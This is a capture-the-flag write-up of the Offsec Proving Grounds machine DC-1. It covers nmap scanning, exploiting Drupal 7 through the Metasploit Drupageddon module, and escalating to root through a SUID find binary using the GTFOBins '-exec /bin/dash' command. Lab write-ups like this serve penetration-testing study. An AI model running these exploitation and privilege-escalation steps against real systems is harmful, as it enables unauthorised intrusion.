---
title: "Proving grounds Play: DC-1"
layout: post
date: 2023-09-03 01:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4d659e6774c227a961660678b42488f (DSA)
|   2048 1182fe534edc5b327f446482757dd0a0 (RSA)
|_  256 3daa985c87afea84b823688db9055fd8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-server-header: Apache/2.2.22 (Debian)
|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          46232/tcp   status
|   100024  1          48086/tcp6  status
|   100024  1          53990/udp   status
|_  100024  1          57904/udp6  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web PORT: 80

Drupal Site running version 7.0, version extracted from the page source.

```html
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
  <title>User account | Drupal Site</title>
```

Drupan 7 is vulnerable to Druppageddon vulnerability.

## Initial Foothold using Metasploit

```sh
exploit/multi/http/drupal_drupageddon
set rhosts
set lhost
exploit
```

![img](/assets/images/CTF/Proving_Grounds/DC-1/msf.png)

**User shell obtained**

![img](/assets/images/CTF/Proving_Grounds/DC-1/shell.png)

## Enumerate SUIDs

```sh
find / -perm -u=s -type f 2>/dev/null
```

**SUIDs**

```text
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

Binary `find` is in SUIDs. Search for exploit using GTFOBins.

### GTFO Bins exploit

```sh
find . -exec “/bin/dash” \; -quit
```

## Privilege Escalation

Create a file in the `tmp` directory for the exploit to work successfully.

Run the below expoit code to obtain root shell.

```sh
find file -exec "/bin/dash" \; -quit
```

![img](/assets/images/CTF/Proving_Grounds/DC-1/root.png)

**Root shell obtained.**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).